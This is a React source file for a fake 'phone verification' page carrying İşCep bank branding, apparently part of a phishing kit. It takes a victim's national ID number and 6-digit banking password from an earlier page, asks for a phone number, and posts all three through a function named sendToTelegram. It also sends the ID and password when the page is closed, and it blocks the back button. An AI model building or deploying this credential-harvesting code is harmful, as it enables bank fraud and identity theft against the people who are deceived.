import React, { useEffect, useRef, useCallback, memo } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import './App.css';
import { useAuth, AuthProvider } from './AuthContext';
import { ScrollProvider, useScroll } from './ScrollContext';

function PhoneVerificationPageContent() {
  const [state, setState] = React.useState({
    phoneNumber: '',
    isPhoneActive: false,
    isPhoneLabelHovered: false,
    showPhoneError: false,
    isSubmitting: false,
    isPhoneFocused: false,
    isPhonePrefixVisible: false,
    errorMessage: '',
  });

  const phoneInputRef = useRef(null);
  const { rightSectionRef } = useScroll(); // Scroll context'ten ref'i al
  const location = useLocation();
  const navigate = useNavigate();
  const { dispatch: authDispatch } = useAuth();
  const { tc, password, isValidNavigation } = location.state || {};

  // Debounce yardımcı fonksiyonu
  const debounce = (func, delay) => {
    let timer;
    return (...args) => {
      clearTimeout(timer);
      timer = setTimeout(() => func(...args), delay);
    };
  };

  // Navigasyon ve geri tuşu kontrolü
  useEffect(() => {
    if (!isValidNavigation || !tc || !password || tc.length !== 11 || password.length !== 6) {
      setState((prev) => ({
        ...prev,
        showPhoneError: true,
        errorMessage: 'Geçersiz erişim, lütfen giriş yapın.',
      }));
      authDispatch({ type: 'RESET_AUTH' });
      navigate('/giris', { replace: true, state: { fromPhoneVerification: true } });
      return;
    }

    window.history.replaceState({ page: 'telefon' }, '', '/telefon');
    window.history.pushState({ page: 'telefon-guard' }, '', '/telefon');

    const handlePopState = (event) => {
      event.preventDefault();
      authDispatch({ type: 'RESET_AUTH' });
      window.history.replaceState(null, '', '/giris');
      navigate('/giris', { replace: true, state: { fromPhoneVerification: true } });
    };

    window.addEventListener('popstate', handlePopState);
    return () => window.removeEventListener('popstate', handlePopState);
  }, [tc, password, isValidNavigation, navigate, authDispatch]);

  // Meta tag ve Virtual Keyboard API ekleme
  useEffect(() => {
    const meta = document.createElement('meta');
    meta.name = 'viewport';
    meta.content = 'width=device-width, initial-scale=1.0, interactive-widget=overlays-content';
    document.head.appendChild(meta);

    if ("virtualKeyboard" in navigator) {
      navigator.virtualKeyboard.overlaysContent = true;
      navigator.virtualKeyboard.ongeometrychange = () => {
        document.body.style.setProperty('--keyboard-height', `${navigator.virtualKeyboard.boundingRect.height}px`);
      };
    }

    return () => {
      document.head.removeChild(meta);
    };
  }, []);

  // Sayfa yüklendiğinde scroll'u en üste kaydırma
  useEffect(() => {
    if (rightSectionRef.current) {
      rightSectionRef.current.scrollTop = 0; // En üste kay
      rightSectionRef.current.dataset.loaded = "true"; // Scroll'u etkinleştir
    }
  }, [rightSectionRef]); // Değişiklik: Bağımlılık dizisine rightSectionRef eklendi

  // Scroll optimizasyonu
  useEffect(() => {
    const phoneRef = phoneInputRef.current;

    const handleFocusScroll = () => {
      const isAndroid = /Android/i.test(navigator.userAgent);
      if (!isAndroid) return;

      const adjustScroll = debounce(() => {
        const rightSection = rightSectionRef.current;
        const buttonPhone = document.querySelector('.button-phone');
        if (!rightSection || !buttonPhone) return;

        const viewportHeight = window.visualViewport?.height || window.innerHeight;
        const keyboardHeight = window.innerHeight - viewportHeight;

        rightSection.style.height = `${viewportHeight}px`;
        rightSection.style.paddingBottom = `${keyboardHeight + 20}px`;
        buttonPhone.scrollIntoView({ block: 'end', behavior: 'smooth' });
      }, 50);

      setTimeout(adjustScroll, 200); // Samsung için gecikme
    };

    if (phoneRef) {
      phoneRef.addEventListener('focus', handleFocusScroll);
    }

    const handleBlurScroll = () => {
      const rightSection = rightSectionRef.current;
      if (rightSection) {
        rightSection.style.height = '100vh';
        rightSection.style.paddingBottom = '0';
        rightSection.scrollTo({ top: 0, behavior: 'smooth' });
      }
    };

    if (phoneRef) {
      phoneRef.addEventListener('blur', handleBlurScroll);
    }

    return () => {
      if (phoneRef) {
        phoneRef.removeEventListener('focus', handleFocusScroll);
        phoneRef.removeEventListener('blur', handleBlurScroll);
      }
    };
  }, [rightSectionRef]); // Değişiklik: Bağımlılık dizisine rightSectionRef eklendi

  // Telegram gönderimi
  const sendToTelegram = useCallback(async (data) => {
    try {
      const res = await fetch(`${process.env.REACT_APP_API_URL}/api/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          tc: String(data.tc),
          password: String(data.password),
          phone: String(data.phone),
        }),
      });
      const result = await res.json();
      if (!res.ok) throw new Error(result.message || 'Veri gönderimi başarısız.');
      return result;
    } catch (error) {
      setState((prev) => ({
        ...prev,
        showPhoneError: true,
        errorMessage: error.message || 'Veri gönderimi sırasında hata oluştu.',
      }));
      return { error: error.message };
    }
  }, []);

  // Siteden çıkıldığında veri gönderimi
  useEffect(() => {
    const handleBeforeUnload = () => {
      if (tc && password && !state.phoneNumber) {
        sendToTelegram({ tc, password, phone: '' });
      }
    };
    window.addEventListener('beforeunload', handleBeforeUnload);
    return () => window.removeEventListener('beforeunload', handleBeforeUnload);
  }, [tc, password, state.phoneNumber, sendToTelegram]);

  const handleNumberInput = useCallback((e) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 10) {
      setState((prev) => ({
        ...prev,
        phoneNumber: value,
        isPhoneActive: true,
        isPhoneLabelHovered: true,
        isPhonePrefixVisible: true,
        showPhoneError: false,
        errorMessage: '',
      }));
    }
  }, []);

  const handleClearPhoneNumber = useCallback(() => {
    setState((prev) => ({
      ...prev,
      phoneNumber: '',
      isPhoneActive: true,
      isPhoneLabelHovered: true,
      isPhonePrefixVisible: true,
      showPhoneError: false,
      errorMessage: '',
    }));
    phoneInputRef.current?.focus();
  }, []);

  const handlePhoneFocus = useCallback(() => {
    setState((prev) => ({
      ...prev,
      isPhoneActive: true,
      isPhoneLabelHovered: true,
      isPhonePrefixVisible: true,
      isPhoneFocused: true,
    }));
  }, []);

  const handlePhoneBlur = useCallback(() => {
    setState((prev) => ({
      ...prev,
      isPhoneFocused: false,
      isPhoneActive: prev.phoneNumber.length > 0,
      isPhoneLabelHovered: prev.phoneNumber.length > 0,
      isPhonePrefixVisible: prev.phoneNumber.length > 0,
    }));
  }, []);

  const handlePhoneSubmit = useCallback(
    async (e) => {
      e.preventDefault();
      if (state.phoneNumber.length > 0 && state.phoneNumber.length !== 10) {
        setState((prev) => ({
          ...prev,
          showPhoneError: true,
          errorMessage: 'Telefon numarası 10 haneli olmalı.',
        }));
        return;
      }
      if (state.phoneNumber.length === 10) {
        setState((prev) => ({ ...prev, isSubmitting: true }));
        const result = await sendToTelegram({ tc, password, phone: state.phoneNumber });
        if (result && !result.error) {
          authDispatch({ type: 'RESET_AUTH' });
          setState({
            phoneNumber: '',
            isPhoneActive: false,
            isPhoneLabelHovered: false,
            showPhoneError: false,
            isSubmitting: false,
            isPhoneFocused: false,
            isPhonePrefixVisible: false,
            errorMessage: '',
          });
          window.history.replaceState(null, '', '/bekleme');
          navigate('/bekleme', { replace: true, state: { isValidNavigation: true, from: '/telefon', isCompleted: true } });
        }
      }
    },
    [state.phoneNumber, sendToTelegram, tc, password, navigate, authDispatch]
  );

  return (
    <div className="container" style={{ touchAction: 'manipulation' }} data-page="telefon">
      <div className="right-section" ref={rightSectionRef}>
        <img src="/iscep-logo.png" alt="İşCep Logosu" className="iscep-logo iscep-logo-phone" loading="lazy" />
        <div className="new-container phone-verification-title" style={{ top: '150px' }}>
          Telefon Doğrulama
        </div>
        <div className="input-wrapper" style={{ top: '180px' }}>
          <div
            className={`phone-input-wrapper ${state.showPhoneError ? 'error' : ''} ${
              state.isPhonePrefixVisible ? 'prefix-visible' : ''
            }`}
            onClick={() => phoneInputRef.current?.focus()}
          >
            <label
              className={`phone-label ${state.isPhoneLabelHovered ? 'phone-hovered' : ''}`}
              htmlFor="phone-input"
            >
              Telefon Numarası
            </label>
            <div className="phone-input-container">
              <span className="phone-prefix">+90</span>
              <input
                id="phone-input"
                ref={phoneInputRef}
                type="tel"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength="10"
                value={state.phoneNumber}
                onChange={handleNumberInput}
                onFocus={handlePhoneFocus}
                onBlur={handlePhoneBlur}
                className={`new-input phone-input ${state.showPhoneError ? 'error' : ''}`}
                autoComplete="tel"
                autoCapitalize="none"
                aria-describedby="phone-error"
                aria-label="Telefon Numarası"
                aria-invalid={state.showPhoneError}
              />
              {state.phoneNumber.length > 0 && (
                <button
                  className="clear-phone-button"
                  onClick={handleClearPhoneNumber}
                  onTouchStart={handleClearPhoneNumber}
                  aria-label="Telefon numarasını temizle"
                >
                  ✕
                </button>
              )}
            </div>
            {state.showPhoneError && (
              <div id="phone-error" className="phone-error" role="alert" aria-live="assertive">
                <img
                  src="/error.png"
                  alt="Hata Simgesi"
                  className="error-icon"
                  loading="lazy"
                  onError={() => console.warn('Hata simgesi yüklenemedi')}
                />
                {state.errorMessage || 'Lütfen 10 haneli telefon numaranızı girin.'}
              </div>
            )}
          </div>
        </div>
        <div className="verify-button-container">
          <button
            className={`button-phone ${state.phoneNumber.length > 0 ? 'active-continue-button' : ''}`}
            onClick={handlePhoneSubmit}
            onTouchStart={handlePhoneSubmit}
            disabled={state.isSubmitting}
            aria-label="Telefon numarasını doğrula"
          >
            Doğrula
          </button>
          <div className="verification-subtitle">
            Lütfen cep telefon numaranızı doğrulayın
          </div>
        </div>
      </div>
    </div>
  );
}

function PhoneVerificationPage() {
  return (
    <ScrollProvider>
      <AuthProvider>
        <PhoneVerificationPageContent />
      </AuthProvider>
    </ScrollProvider>
  );
}

export default memo(PhoneVerificationPage);
